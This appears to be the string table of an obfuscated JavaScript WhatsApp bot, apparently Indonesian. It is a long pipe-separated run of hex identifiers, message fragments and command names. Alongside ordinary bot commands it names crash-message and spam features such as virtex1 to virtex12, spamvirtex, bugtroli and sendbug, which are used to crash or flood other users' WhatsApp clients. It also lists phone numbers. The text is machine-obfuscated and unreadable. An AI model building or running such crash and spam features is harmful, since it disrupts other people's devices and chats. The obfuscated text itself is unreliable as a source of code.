0a1|||x20reply|x20bermain|Succes|x20delete|green|x20Error|all|x200|Selamat|x20waktu|x20bug|gif|x20dia|Sudah|fileSha256|linkgc|x20ya|mp3|simi|writeFileSync|content|badword|slice|scdl|autoLevel|0x979|_0x114a21|0x3dc|externalAdReply|_0x331fc1|0x31b|_0x3a0ae3|0x23e|0x428|_0x2dd85d|_0x5c6e7f|0xb2b|0xa70|_0x51a9a9|0x53c|_0x4d3665|_0x498d58|_0x44d267|_0x16ece8|_0x283c93|_0x5877ab|anu|_0x266e9b|0xb5a|_0x4fc12a|0x940|0x76b|0xa20|0x3bb|0x365||_0x67eb|Presence|yts||error|exif|cekBannedUser|virtex|antibugtroli|chatBot|x20saat|x20Hari|x20Menit|x20menu|x20Sedang|x20Anonymous|x20suit|x0aSelamat|x20perintah|x20sekarang|x20sticker|x20mematikan|x20to|x20mengaktifkan|x20temukan|Limit|06|x0aWaktu|nama|startsWith|fileLength|chats|splice|x20fitur|enable|0x994|0xaf3|0x219|_0x148a43|_0x317e45|0x32|vcard|0x48d|_0x427d67|contentText|footerText|headerType|0x8e0|locmhan|_0x538add|_0x25cb98|hmm4|imeu|imeg|0x7a2|0x6bd|_0x4c5ee7|0x687|0x602|heheh||0x9ef|_0xc17554|_0x13c512|0xa56|0x488|anuah|0x238||outGif|0x5f4||0x5f5e100||0x300|_0x1a5bcc|_0xd50ee7|0x76f|0x7e1|_0x15ff75|_0x3f96ba|_0x38b163|bioij|delib|0x5e2|jds|ranm|oi2|_0xe99b39|320|_0x282d94|_0x443010|_0x4366dc|0x3|axios|upload|voting|translate|virtex6|offline|caklontong1|x20bukan|x2010|Bot|x20selama|Nama|x20for|x0aNama|x20dapat|Teksnya|x20ingin|enc|x20the|Asia|x20Sesi|x20Untuk||logo|application|welcome|x20ah|x20welcome|x20berhasil|Command|watch|forward|suit|toLowerCase|x20GROUP|http|x20sewa|x20game|anonymous||vcodec|query|x20om|Jumlah|x20qr|x20quoted|x20mengecek|base64|x20developer|Broadcast|product|NotCase|getCmd|_0x43c7a0|_0x2518d8|_0x53206b|_0x5542e3|_0x271478|_0x14b9b1|_0x4f5cca|0x7aa|0x64a|_0x516045|_0x1e6b0e|_0x4dfae6|0x2ba|0x43d|0x808|0x22c|0x96c|_0x20f82d|_0x41cd8e|0xa7f|0x191|_0x3e63ba|0xb52|0x327|0x717|_0x56f120|0x18d|0x48f|0x5d1|0xadc||_0xdee2d4||_0x3e4c4e||_0x1f1478|_0x379b45|_0x4bb973||_0x5a2c48|_0x9f4a5a|gbutsan|GroupSettingChange|prepareMessageFromContent||relayWAMessage|speed|request|util|convert|brainly|SoundCloud|sewabot|getLimit|senbadword|welkom|_claim|allpref|nsfw|waktu|autoReport|6285156137901|x20karena|block|x20Premium|x0aBot|stick|x20Game|x20Jam|x20siapa|x20dalam|x20Partner|gtts|GAME|x20jadi|x20Saldo|x20menggunakan|seconds|x20audio|x20AUTO|Format|x20melihat|addprem|zekais|youtu|x20Durasi|x20image|x20laporan|x20aja|x20masih|x20audionya|x20Chat|x20mati|participants|x20nya|description|profile|main|white|check|get|toLocaleString|battery|ghost|sender|x20vn|pilih|x20main|folio|hanya|search|Bjeer|test|0x6d7|_0x2b92ff||0x6f4|_0x19d39f|_0xf6a937|0x3d6|_0x4d218e|_0x4e7f72|kma|_0x4cea88|_0x486995|_0x4e3ccd|0x7db|_0x17a5d0|0x736|0x1b8|_0x654068|_0x24e2bb|0x1d4|process|_0x458c6d|_0x26630b|0x68d|sami|_0x4ad062|0x5c5|0xabb|anuh|nano|_0x4f01c6||_0xee0f73|0x363|yamyam|_0x42901c|0x59c|0x7b6|_0x213e54|_0x257441|_0x4dc03d|_0x1f5217|options1|0x442||0x65e||||expect200|jids|0x90a|0x6f6|_0x3888c4|||_0x210a4b|0x26c|0x3ca|_0x2f159f||0xb65|_0x1bb794||0x67c|argzi|0x598|0x7a7|0x9ff|membr|dtt|_0x68e83f|_0x305ae5|nah|_0x4ca902|_0xf4746|0x865|x27|_0x19f8f4|_0x1f9447|_0x323f69|_0x4b0a2a|_0x3cdcc4|_0x691495|_0x69c2|_0x3e35fa|spawn|anime|giveLimit|Dashboard|totalForward|antibadword|x20Admin|x20User|hasil|Yahaha|x20malah|x20nyerah|x0ajawabanya|x0aNOTE|x20gc|kick|x20can|Jakarta|Desc|x20Mencari|x20mao|x0aHadiah|x20clear|neon|x20doi|x20status|pernah|x20pernah|x20is|x20prefix|x20list|x20kan||x20alasan|x20dapet||Hasil|x20targetnya|dev|x20Digunakan|instagram|YOUTUBE|x20DOWNLOADER|asetrate|x20suka|hari|text2png|composing|Anticall|x0aJumlah|antidel|github|gold|pecundang|x20kena|x20troli|size|desc|x20sesi|SETTING|x0a2|x0a3|x0a4|x0a5|waifu|setreply|buylimit|x20Jangan|x20Tag|menit|international|x20lupa|x20contoh|contentLength|getNumber|Group|x20Title|x20silakan|glitch|x20kode|x20gak|x20hari|buku|uploads|x20claim|admin|x20Bug|banned|purple|owner|format||x20sholat|x20dikirim|Pertanyaan|ftroli|quotedMessage|broadcast|stickerMessage|prepareMessage|creation|fps|x20sebanyak|values|quotes|_0xdc9f32|_0x192687|0x36f|0x494|0x7f9|0x449|_0x4827be|0x64|_0x378f6c|productMessage|productImage|priceAmount1000|productImageCount|businessOwnerJid|fileEncSha256|mediaKey|directPath|mediaKeyTimestamp|previewType|orderId|token|mediaType|mediaUrl|_0x1970a4|0x91e|0x4fc|_0xa862be|_0x9c7fb|_0x47cd6c|_0x39d741|_0x3c6794|_0x2db483|_0x5d3e2c|_0x391572|_0x51f140|_0xec16ee|0x4b0|0x7d0||0x5a3|_0x1d8000|0x9f4||_0x2243bf|0x331|0x633|_0x39b238|_0x2fc2e4|_0x800f28|_0x103e07|_0xaa1a8f|_0x4bd5fc|_0x59ea34|0x41f|_0x541da1|_0x49ed04|0x519|_0x39a0bd|output|0x46e|_0xd0da26|0xb04|0xa24|_0x65f673|0x745|0x3c|0x9d4|0x756|method|_0x1bd9f8|_0x579c88|0x685|quality|0x545|yahu|0x711|_0x3e8ed4|ini_gen|_0x3bba57|_0xb9524|_0x321c3e|_0x2b04f4|0x9c4|0x621|0x7cd|0x94c|String|0x7fe|_0x2f3d45|0x75f|_0x409217|_0x393a67|_0x4abb50|_0x37696d|_0x4e5ca1|_0x1deeb0|_0x141cce|0x6f3|_0x5860bd|0x1fd|_0x3af36d|0x99e||0x812|_0x290e0b|_0x54ff7f|ahenak|_0xfad82a|_0x5beeca|||isNaN||_0x4de34a|_0x3124af|_0x35505f||x20maka|0x81e|0x804|0x2c8|_0x2c2975|0x556|_0xc1aa3|0x751|_0x483f09|_0x3f673f|0x6cd|_0x2bc218|_0x40abe3|_0x5556dd|ahuh|_0x37e518|_0x54547e|_0x1d42b1|_0x35fb7f|_0x5c795c|_0xb5e9b8|_0x38f438|0x7c9|0x6|0xb|imageToBase64|scraper|acrcloud|spotify|week|success|kyun|hentong|help|msgFilter|uploadFile1Day|isTicTacToe|kurangBalance|cekGLimit|delCountKasar|addBanned|unBanned|addBlock|unBlock|philip|ngazap|prefa|0x3c8|siminya|alasan|jeda|teksChat|x20saja|x20lebih|x20diterima|x0aKamu|addrespon|x0aUntuk|x20membeli|math|x20button|x20hidetag|x20Bapack|x20bang|Hanya|invite|t62|This|x20be|x20used|x20Berada|x20Tekan|x20Button|vote|setquoted|x20mungkin|x20read|x20sedang|x20lain|zip|x20TO|x20URL|x0aUrl|x20ban|x20mendapatkan|x20tampilan|x20jangan|x0aSisa|Baik|Linknya|x20lu|x20terjadi|x20video|x20unblock|timestamp|x20foto|x20input|x20target|x20virtex|x20angka|Thanks|style|yellow|groupRemove|x20BOT|x20menambah|x20baru|x20keluar||||x20jatah||keys|x20Channel|antilinkgc|x20a|||x20LINK|antivo|x0aPilih|x0as||x0ah|x0ad|x20bilang|x20Kami|x0auntuk||x20database|fvn|thumbnaildokumen|x20berapa|pastebin|ytimg|masukan|x20terdaftar|x20Nama|x20anti|Yang|x0a6|x20Telah|groupMetadata|x20aktifkan|x20tunggu|bot|magenta|x20Bro|x20Yteam|x20Detik|x20nanti|Textnya|find|trunc|Gunakan|Foto|Bentar|VCARD||location|buyglimit|x20Teksnya|x2020|x20Broadcast|Downloading|jumlah|x20not|x20mu||04|x20WANGY|ttpcolor|buttonsResponseMessage||playmp4|x20TEBAK|off|x20ID|x20menghapus|teksnya|antivirtex|scdoc|x0aPetunjuk|x20tanya|Done|setbc|x20respon|getInfo|now|x0aNomer|sqdefault|prem|x20download|2000|OFF|x20berikut|x0a10|x20antilink|halo|x20key|x20send|jawaban|fimage|kode|Bowner|dana|notify|x20jumlah|x0aLink|x20id|setelahkiri|messageSend|document|x20Vote|stanzaId|x20Developer|getProfilePicture|x20ngak|_0x1d8a8e|_0x556c67|_0x5a097e|0x251|_0x4fe014|0x72f|0x1c6|_0x2d9fd1|subject|0x824|0x67e|_0x6f7d45|_0x2bd1e7|_0x24ea0f|_0x2408a6|_0x25b54e|_0x4866b4|_0x236377|0x54d|height|width|0x268|groupJid|inviteCode|groupName|0x438||0x437|0x690|sourceUrl|_0x422852|buttonMessages|0x193|productId|descriptionCount|_0x23cf62|_0x184923|_0x449662|_0x5699f5|_0x58a47e|_0x1a887b|_0x459e2f|_0x113b85|0xa15|0x4ce|0x99c|_0x5d1d35|_0x1dfeb2|_0x5bcc38|_0x566184|_0x5ce55a|_0xf1c9ed|0x259|_0x36b253|_0x20aead|0x463|_0x19ac88|_0xe63ef6|0x7e0|sapi|0x66d|_0x14003a|_0xf02e8d|0x2b0|_0x551ca0|_0x3863f4|mp4File|_0x170ed9|0x3cf|_0x5cdd2e|_0x34dd67|0x855|_0x57d415|_0x48d73f|_0x1be34a|_0x3f26dc|_0x4ca898|_0x27d1b6|_0x3b5519|_0x6bd9bf|_0x35b78f|_0x5d31c6|0x88b|0xb63|0x8db|0x9f8|degreesLatitude|degreesLongitude|address|_0x117d80|_0x4ae282|0x435|_0x340649|_0x474687|ano|ani|sample|0x468|0x212|0xa64|0x4b9|0x787|0xa0a|_0x52beec|_0x5d9540|_0x2ec8f0|_0x20353b|owgi|anu4|_0x1a1db0|oppp|datae|_0x104864|_0x20fb3c|0xa08|_0x1592dc|_0x1b39a7|_0xb09541|_0x5185aa|0x2ca|_0x3244bc|low|0xb6e|_0x22c27c|_0x3541e8|0x5df|_0x5d4d16|0x741|_0x1a0611|0x590|0x2f6|_0x2b20c0|_0xbf4263|_0x83d71a||||cos|0x483|0x249|0x267|_0x5de7df|_0x2d6556|0x7ea|0x871|wanu||_0x5e0f94|yeh|_0x425a98|_0x168b4d|_0x57a605||_0x506210|_0x55fc38||0x4fe|0xb07|Anu|_0x17ccb7|_0x13363a|_0x418ccd|_0x18aaed|_0x589a97|0x1f3|_0x51b254|_0x24ffb1|_0x598c08|0x8c2|0x18e|0x1b0|response|0x29f|_0x1d5f9d|0x8f5|_0x4e71b8|_0xc5241f|0x908|0xb03|_0x202546|_0x44b556|_0x1debe6|x20kerasukan|_0x3cb84c|_0x3af994|_0xee2ede|_0x4447f8|_0x55a42c|_0x12c608|_0x40ede1|_0x3cf4c7|_0x23358d|its|0x39e|_0x157ccf|x20zh|||x20Chinese|x20en|x20English|0x9c5|_0x13c30e|_0x653ed7|rname|0x901|||0xa32|0x356||0x629|0x9a7||_0x3549f6|_0x3e70dd|_0x1ac40a|oi1||ara|_0x3ac971||vars|_0x1b9fc7|0xa9f|_0x47904b|_0x13043b|_0x27686a|_0x18e5cd|ranw|_0x1be154|_0x19b13b|_0x4d4cd4|_0x59bfd2|_0x40b342|_0x596a14|_0x4f3376|_0x17fd91|_0x96d447|_0x97310b|0x184|0x5|0x7|0x8|shift|ameApi|core|Download|acr|songlyrics|default|lyrics|googleImage|alquran|CuteFFMPEG|FFMPEGRequest|weton|dateIslamic|formatDate|runtime|start|isAfk|addafk|donasi|SpamExpired||simple|tictac||getClaim|pinterest|wallpaper|tekssalah|tekscmd|teksspam|ilhamberkata||ngebucin|userLeveling|addUserId||checkCommands|isKasar|addError|addblockcmd|checkblockcmd|blockcmd|ucapsalamikum|enggakmau|ucapmalam|ucapsiang|ucappagi|botz|unregister|ucaphai|toxicbro|spamnih|loplop|virtexbytsukasa|antivirus|jsonfile|gaboleh|namalu|namaDocument|nomerbot|gender|docx|kapankah|x20tentu|x20menit|genres|Searching||fvideo|photo|x20choosing|x0aHarga|gunting|getJawabanMtk|fitnah|x20stickernya|x20_|reportbug|000|x0aatau||x20tekan|x20bawah||attp|myprofile|x20bebas|||x20jajas|x20titin|x20feature|fetcher|code||x20all|Owner|x20mengganti|x20bio|x20Tahu|x20Judul|x20Offline|Alasan|x20unban|x20beban|x20tod|x20awokawok|x20O|Maap|full_duration|antichatbot|Perintah|kontak|x20hanya|x20pacar|encrypted|tbn0|gstatic|tbn|ANd9GcTilzqEC5QYKt2_J8OyIBNlciLAd1sbCKgpNA|usqp|CAU|Auto|x20terdeteksi|delrespon|antitroli|x20berupa|x20lokasi|pilih2|pastikan|formats|Vote|x20Yang|siapa|autolevel|x20Dapat|TEL||waid|reel|type2|isBaileys|Hai|webpmux|set|x20exif|blockUser|x20lalu|ftoko||Start|red||x20semua|kirim|x20voice|shorts|soal|Masukkan|Tunggu|x20bales|x20sementara|groupInviteCode|fsticker|x0aKetik|dari|x20broadcast|mmg|x20kata|x20Menambahkan|spam|x203|Scrapping|x20dokumen|x0akamu|x20sabagai|x0aterimakasih|x20Pencarian|x20tictactoe|hal|getStatus|x20harus|type3|1610993486|Lokasi|x0a7|x0a8|x0a9|pics|Satu|x20Url|getTrack|x20or|x20Temperature|x20si|promote|x20Disini|x20idgc|x20Ini|x20mandi|x20file|bagaimanakah|x20whatsapp|state|deeppink|Ciee|Maaf|x20belum|Jangan|x20yg|udah|x20level|x20LIST|x201h|ALL|x20BERHASIL|x20DI|x20HAPUS|likes_count|antilink|x20hapus|x20downloader|other|autotyping|BOT|x20ADMIN|autowelcome|batu|antihidetag|troli|votes|Bsystem|x20Link|x0aSilahkan|run|x20HH|x0a_|Total|wiki|x0acontoh|Mohon|x20Voting|x20Grup|pdf|anticall|x20set|x20report|x20Michelle|1995|claimOn|setelahkanan|x20GUA|x20anime|Example|x20HU|x20HA|rate|remove|x20memilih|x20Laporan|listprem||bisakah|amaterasu|x20paling|array|updatePresence|x20tau|uptime|asw|x20pemain|x20web|x20Temukan|x20mantan|messages|x20pasangan|x0aInfo|Tanggal|wrongFormat|teriak||x20pake|x20kasar|hours|x0aIngin|TOmXzkWuCWk|x0aTanggal|x20AKU|WAITING|pointsize|16505434800|vname|x20youtube|from|gambarunik|2019|Top|Gambar|Profil|Kosong|Lucu|Tergokil|floc|filterFormats|x20DETECTED|x20maaf|fgc|1000|fgif|crop|dashboard|smeme|ftext|mqdefault|toFixed|x20CMD|x20BLOCK|x20negara|JAWABLAH|x20SOAL|x20BERIKUT|freeoneday|x1b|ephemeralMessage|x20libwebp|x20fps|lossless|loop|preset|x20default|vsync|x20512|512|x0aAu|permalink_url|createWriteStream|Awali|x2062|vnd|openxmlformats|officedocument|eror|x20ffmpeg|deskripsi|x20GAK|x20PEDULI|x2011|0x5cf|_0x20f936|_0x14ae5d|checkSCommand|_0x55724f|_0x2e93d3|_0x37c378|_0x1ca65e|_0x205259|0x609|_0x29bcc1|_0x36e2f0|_0x2f710e|_0x5ead7f|_0x12dfa4|_0x381691|_0x4df6af|_0x434035|_0x154541|_0x8f16fb|_0x3e7be2|0x1f6|0x213|_0x1e5f80|x20pagi|_0x49e9ad|_0xf6d36b||displayName|_0x45720b|_0x2ffc76|_0x4df8d5|_0x3178fc|_0x14d728|_0x5dd4ae|_0x5db6c2|_0x5803a8|_0x2d67c6|0x341|scansSidecar|0x76a|0x2b2|0x86f|0x31c|0xaed|0x7fb|0x811|0x55f|0x9f5|0x643|_0x2c502a|_0x23b650|0x490|0xb43|0x881|_0x3be4f1|0x4a6|0x928||0xb6d|_0x1e0e2a|_0x4867e8|_0x5bcdf7|_0x56ce8a|_0x123814|_0xf23fc5|_0x5ac6a9|_0xf3f1f1|_0x573366|_0x443580|0x86a|0x6af|0x482|0x7f8|0xa6d|_0xaeaa32|_0x4d764e|_0x272abf|_0x237eac|_0x3e369a|0x2710|_0x200d45|_0xd273cc|_0x37c85f|_0x5dcb83|0x6eb|0xbb8|_0x36f15c|_0x1ed00d|_0x9ac813|_0x2ab77c|_0x125af3|0x51f|_0x150f1d|_0x32a146|_0x261420|0x8dd|0x790|_0x4777b5|susu|levelnih|0x8ea|0x9d9|_0x1c6b45|kertas|_0x141a7b|_0x4ebfd6|0xab6|_0x28f499|_0xa7a312|_0x62891f|opusFile|path|_0x243bc5|_0x14d28a|_0x51de41|_0x4f2c0d|0x900|0x635|_0x29839|0x559|_0x2a5740|_0x484dac|0x370|_0x1d0f98|_0x5c7b4e|_0x529abc|_0x2bf939|0xa05|0x3d7|_0x58e01f|0x57a|0x2c4|_0x3d99c|_0x3e9c0f|0x1cb|_0x451fd2|_0x30fa0e|_0x146457|_0x22506b|_0x579022|_0x1c9d68|0xab5|0x1d8|0x2d4|0x661|0x7c3|0x94e|0x263|0x93d|0x52c|0x4c7|0x819|0x961|_0x4ce404|_0x48265c|regex|_0x421506|0x55d|_0x310501|_0x14fc8f|_0x21545e|0x9ed|0x79c|_0x490ef2|quickReplyButton|_0xfd50ae|0x6b0|_0x3cbfe0|_0x186515|_0x1d70b4|0x89e|0x1e4|0x64d|0x9f2|_0x3fdde8|_0x4a69aa|_0x526662|0x7e9|_0x4cb51a|_0x2ee40f|0x71d|_0x39eadb|0x4f0|0x4f2|_0x34b98a|_0x115759|_0x48b869|_0x4db3bb|_0x105f3f|_0x5991f6|_0x32d5e2|_0x542f4f|_0x54f72c|_0x5a0639|0x375|_0xd79f1c|_0x21284b|_0x2842f7|_0x40cfac|_0xb64727|0x25d|_0x1c9b72|0x2cc|_0x3d134b|0x704|_0x4a2cc6|_0xe1b907|0x56f|_0x19112a|_0x18a013|_0x553cca|_0x31833a|_0x1059e8|0x373|0xa88|0x65d|0x7e7|0x8a5|0xaba|0x63f|_0x13a058|0x19c|inviteExpiration|_0x42e03b|036105801662316|09072320256624|_0x423108|0x8e9|_0x1871a1|subjectOwner|descId|descOwner|descTime|0x19b|fak|0x7a4|0xb42|0x7c7|0x57c|_0x5ac166|0x566|0x9a1|0x6ab|0x5b2|0x656|_0x26d99a|_0x210a71|x20typing|_0x200262|_0x4bbcff|_0x31a791|_0x53d963||_0x24dbf5|_0x2987cb|0x20d|_0x5590f4|banya|_0x21ebd8|0x294|_0x28cabf|nene|_0x43a164|0x2bc|_0x6a4437|0xa9a|0x2ff|teman|0x1388|_0x332ad3|_0x204aa6|_0x3c9f54|_0x3118ff|_0x45c47e|_0x3e03db|_0xa31aa8|_0x5418f5|0x5ad|_0x4e0a90|0x5bc|0x2d6|0x22f|0x8b6|_0xdeef76|_0x58dd3a|_0x5e8e8a|_0x563418|0x782|0x199|0x198|0x227|0x1c5|lala|0x1ca|0x189|0x917|0x989680|0x63a|fami|_0x40fce0|pin|0xaaf|0x950|_0x2778f3|_0x17ef6e|0x2f1|_0x4fdc6d|_0x1fb8e5|_0x4075ae|_0x27fa64|_0x34c904|_0x4d2674|_0x262675|_0xedf6bc|_0x96a42b|ane|_0x5b0950|_0x31a109|_0x3387c5|_0x3c3e5f|_0x53d727|_0x3fd534|_0x4a86d8|_0x443246|_0x2b6782|_0x4f066d|_0x48bcba|_0x422248|prmm|_0x555d38|United|x20es|x20Spanish|_0x184870|_0x3eeead|_0x2af3c0|_0x573f26|_0x3f69f0|_0x45a55a|_0x5f2558|_0x382043|_0x5a9069|_0x55dcb0|_0x3ffcdc|apakah|_0x2080e7|_0x3246d7|_0x508a35|_0x3ebfec|_0x5bee7e|_0x13cd31|_0xfd396c|_0x54f5d7|watak|_0x5699a3|hobby|_0xee7247|_0x4d7bfa|_0x6f46e3|_0x242119|_0x22d9d5|_0x529a0f|0x258|_0x2b5b96|_0x236a92|_0x2db254|0x58a|0x8a1|_0x40f36f|_0x10aace|_0x54de66|_0x31961f|_0x3a0018|_0x5dc627|_0x2b72eb|members_ids|_0x70e507|_0x4664a6|0x4d2|_0x273600|medok|x20atempo|mele|mela|medoi|masa||_0x1e1be8|_0x47b962|_0x391d0e|_0x1ae2fb|tipes|_0xce0d4d|_0xd3fa08|_0x5b4b2a|_0x176135|_0x3a305c|_0x3b3096|_0x4bcfac|_0x474035|_0x2e544b|_0x4488e6|_0xa1b5ed|0x9b3|_0x2cfe8e|_0x49b5f4|_0x110a72|_0x2262d6|_0x714972||_0x412da3||tagg|shape|_0x1671d3|members_id|_0x2b1195|_0x5e1b75|_0x422498|0x9cb|_0x4bd0eb|_0x25d9b0|_0x43915a|_0x477258|0x6d2|_0x1b4bd7|_0xcbc330|0x3d4|x20jika|_0x3d400a|_0x7fd232|_0xb60adc|_0x4e1fa9|_0x5b46d3|bang|_0x69c2fa|_0x184186|while|_0x4fa36e|0x9|EmojiAPI|igApi|matematik|gis|ameClient|removeBackgroundFromImageFile|Brainly|Jimp|identify|Spotify|facebookdl|facebookdlv2|wallpaperv2|jadwalTVNow|gempa|gempaNow|0x457|Ffmpeg|Exif|parseMention|getGroupAdmins|close|createExif|afk|sleep|cekafk|addVote|delVote|info1|wikiSearch|getPosTic|addAutoClear|autoClearChat|checkAutoClear|checkClaim|expiredClaim|addUserClaim|getHit|cmdAdd|expiredCmd|bad|katahai|katamalem|katasiang|katalopyou|badud|ohayo|salam|thanks|getDateId|resetLevelingXp|userXp|getLevelingXp|getLevelingLevel|getLevelingId|addLevelingXp|addLevelingLevel|0x989|gethitUser|checkHit||AddHit|givegame|addDb||clearAllDb|addCommands|deleteCommands|addBadword|delBadword|addCountKasar|isCountKasar|clearAllBan|checkError|deleteblockcmd|virtex2|virtex3|virtex4|virtex5|virtex9|virtex10|virtex11|virtex12|slayer|spam2|istigfar|ucapsalam|samasama|kumsalam|0x921|0x877|0x2eb|ephemeral||onepref|0x8b9||0x80b|0x6fe|0x806|0x6e6|antiPrivateChat|0x650|extream|_0x3ea701|violet|Izin|Troli|_Thanks|publisher_metadata|hai|google|x20Fitur|x20hai||x201000|x20open|Judul|x20boleh|x20jadikan|x20jenis|Only||x20Lu|x20Masih|x20Punya|extendedText|Alah|x20sia|x20mah|x20yekan|Namanya|x20lagu|ccb|Aku|neko|x20Sendiri|play|x20badword|ibb|Tq7d7TZ|age|hananta|495|joker|x20blom|x20tantang|x20Command|Bjir|VIDEO|Suksek|sendFile|kickarea|x20kalo|pptx|Jumlahnya|Klo|x20yah|x20Tod|iya|antiasing|add|x20I|x20N|SYSTEM|x20Tanggal|blue|x20forward|Iya|x20jelek|VERSION|SOUNDCLOUD|x20Hasil|x20Ditemukan_|x20Khusus|x20autosticker|thanksuser|x20Size|chatRead|sendbug|sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG|CyRY|adderror|Khusus|videoId|x20up|end|x20Upload|x20jawab|x20system|ovo|x20succes|x20promote|listbadword|Apa|x20Mau|avatar|x20sange|x20diubah|unblock|x20Daerah|x20Nomer|Dia|baru|Asek|Admin|carbon|tekschat|x20Release|Hmm|CELL|VOICE|getTBPosi|weather|wolf|galaxy|isfam|lonte|track_format|foliokiri|x20text|x20videonya|DEVELOPER|x20panggil|x22atempo|vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc|x20daftar|pap|isGroup|Yah|x20ONLINE|x20time|Sejak|antispam|ketik|x20vote|x20setuju|x0aSaldo|x20i|x20call|x20u|x20mode|getJawabanTK|Key|KODE|x20QR|haribaik|x20pada|Tepat|screenshot|Not|similarity|groupInviteMessage|x20Banned|x20Jika|x20repository|x20cek|xlsx|raw|githubusercontent|pajaar|gambar|updateProfilePicture|Message|x0aLimit|filter_complex|setpts|PTS|atempo|x20menolak|durasi|Wuanjir|x20kirain|x20huh|x20hampir|x20ditemukan|x20self|ytmp3|x20gcnya|x20antivirtex|Grup|x20tersisa|x20kaya|x20gitu|masukkan|x20anak|Premium|x20features|x20Audio|x0aCek|x20cara|groupDemoteAdmin|utm_medium|copy_link|fdeface|getidgc|86400000|addOutputOptions|INFO|x20BOTZ|janckuk|62895619083555|isZero|x20NGGAK|setStatus|x20mencukupi|hode|x20pakai|x20bikin|x20pas|open|Untuk|x20memasukan|vidio|read|delprem|x2062851xxx|x20Gitu|x20Dalam|x20Mengirim|metadata|sfw|jam|Eror|3200x2180|has|x20been|x20blocked|x20by|x20please|x20name|checkPremiumUser|x20Terdeteksi|getSAPosi|banuser|Nsfw|x20malam|x20sakit|x20forwarding|x0asilakan|x20Paling|x20Adalah|28777|x20stiker|playmp3|05|getJawabanSA|x20Anda|x20no|x20Sudah|x20info|x20cih|x20Ada|x20LEVEL|allmenu|toFormat|minutes|x20T|x20K|x22crop|crf|x2025|x20mp4|x20libx264|pix_fmt|x20yuv420p|x20tikok|music||x20HARUS|x20JADI|x20Member|x20Ga|x20jelas|chooseFormat|x20Prefix|natural|x20dibatalkan|BEGIN||x20Description|x20Status|addorder|99999|Menu|contact|x20All|x20baca|locationMessage|x20Kalah|pipe|artists|sendhidetag|x20sendbug|pesan|x20deh|Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU|x20Tunggu|Kunaon|Nonton|cekprem|gopay|x20angel|x2018|20005|audioonly|x0aRespon|x20second|checkSewaGroup|tipe|scmp3|Sekarang|addsewa|audioMessage|x20Viewers|web|cekbapak||simpcard|x20tipe|x20easy|logosvgpng|2018|vector|x20kali|x20AAAAAAAAH|reposts_count|x20again|x20AUTOREAD|x20menjadi|x20your|interline|spacing|contactMessage|7118|21427642_840952686474581_572788076332761430_n|3f57c1ba2fcab95f2c0bb475d72720ba|602F3D69|ytmp4|Membantu|horny|RULES|drop|x20TWITTER|tinyurl|Usage|twitter|author|x20only|x20bruh|x20sebelumnya|x20simi|x20menambahkan|shop|x20sebentar|GRUP|repo|x20Menang|Soal|Asik|foliokanan|x20saya|x20kok|spamvirtex|mess|libwebp|source|x20crush|x20ss|timeout|addPremiumUser|isFiltered||x20Antichatbot|B826873620DD5947E683E3ABE663F263|fkontak|nuliskiri|60dd75b0081979507a679f99||x20kutipan|x20terus|x20member|x20buat|x205|Masih|x20soal|x0aKedalaman|x20ulangi|x20peluk|light|msg|siapakahaku|x20sayang|Laporan|LIST|documentMessage|x20trus|cuaca|click|x20here|x20play|x20music|x20join|memeindo||copyNForward|stop|Unlimited|x20gw|linkwa|x20kesini|x20antihidetag|Anda|x20tebak|x20karakter|head|Tanggalnya|x0adetik|x0amenit|x0ajam|contoh|succes|HALO|x20KAK|listblockcmd|emror|x20Anticall|x20siah|x20aing|62xxx|x20emang|dropwater|opus|SPAM|forEach|x20antiviewonce|x20BADWORD|x0aHalo|x20Gc|mute|Cek|sebelumkanan|xteam|xyz|kota|_Lawan|x20memilih_|x0aSekarang|x20giliran|Success|igstalk|ERROR|SEWA|bokeh|x20melakukan|CMD|x20mengirimkan|Members|x20Unban|x20bahasa|x2024|Kebanyakan|isTebakGambar|qrcode|Partner|x20Meninggalkan|x0aSilakan|x20lawan|acceptInvite|x22i|x20hv|x20you|x20terakhir|x20sini|CHATTING|telegra|Asekk|masukin|setdana|x20Bjeer|x20Keknya|x20Scriptnya|generate|x20bugtroli|x0aMagnitude|Usernamenya|trim|volume|Dah|suka|Case|NOPE|cmd|x20WELCOME|Episode|font|x20explain|apa|ceksewa|dokumen|37m|isTebakBendera|question|black|x20Reply|x20Exp|x20blum|x20tertebak|Ada|sebelumkiri|x20Album|kbbi|Sorry|delPremiumUser|3600000|toString|simsimi|6285751056816|x0aSoal|pixelate|x20manggil|Durasi|viewOnceMessage|take|Siapa|x20diam|blur|buyprem|x20mess|nuliskanan|getTAPosi|zinmin|x20add|getJawabanTB|30s|babi|date|PHOTO|collection|asal|keluar|1627579259|revoke|Music|Kusus|x20masukan|node|YYYY|isTebakAnime|true|x20Berhasil|x20bonyok|Pembeliaan|bear|Mana|x20Saya|Yok|x20Al|fatihah|Anime|x20found|modifyChat|x20tuh|wget|x20vidio|x20kickarea|expired|Bismilah|x20Kick|x0aitem1|User|x20Duration|x20SAMA|OFFLINE|finish|indexOf|x20joe|2003|x20putri|2005|x20dimulai|0x86d|features|0xb50|tiktoknowm|0x997|0x88f|0x3ab|0x2a7|0x879|0x7ff|0x758|0x8cf|0x1e2|0x750|0x803|0x948|0x689|0xb27|0x43e|0x472|0xaf8|addCmd|_0x4ab6a7|_0x4d5ce9|_0x4fb052|0xa59|getCommandPosition|_0x293871|_0x527acd|0x794|_0x48bd90|_0x178bfc|_0x23d332|_0x53e42c|0x5a1|_0x497696|_0x1271e0|_0x4b0bf5|_0x4734a3|_0x402de8|_0x49207d|_0xe6548b|_0x5cb612|_0x35343b|_0x4f0209|_0x5cde23|_0x55e994|_0x4c6472|_0x3c1499|_0x5b4287|_0x95bdfd|_0xedda9f|_0x551026|_0x2c99cc|_0x2ccfe0|_0x51052c|_0x28a929|_0x727c04|_0x3f335f|0xad6|0xa83||0x703|_0x1288d2|scrap|0x5e3|0x50c|0x346|Badmin|x20wrong|0x88e|0xaca|retailerId|0x40|0x722|0x8e4|0x3de|0x2a6|0x201|0x31a|0x6e0|_0x524eca|0x766|_0x39a6a1|_0x4a6674|_0x3a516a|0x1d2|_0x4598cb|_0x4ab090|_0x5910cb|_0x528909|_0x276f95|_0x1b2aff|_0x488ae6|_0x5e2eff|_0x1c919d|_0x356076|_0x34e8e3|_0x13531d|_0x934f97|_0x4feef1|_0x375525|_0x2145b4|_0x1ed877|_0x3b4ba9|_0x11b00e|_0xc595b7|_0x14cc9e|_0x4ebad0|_0x553e7c|_0x1bedf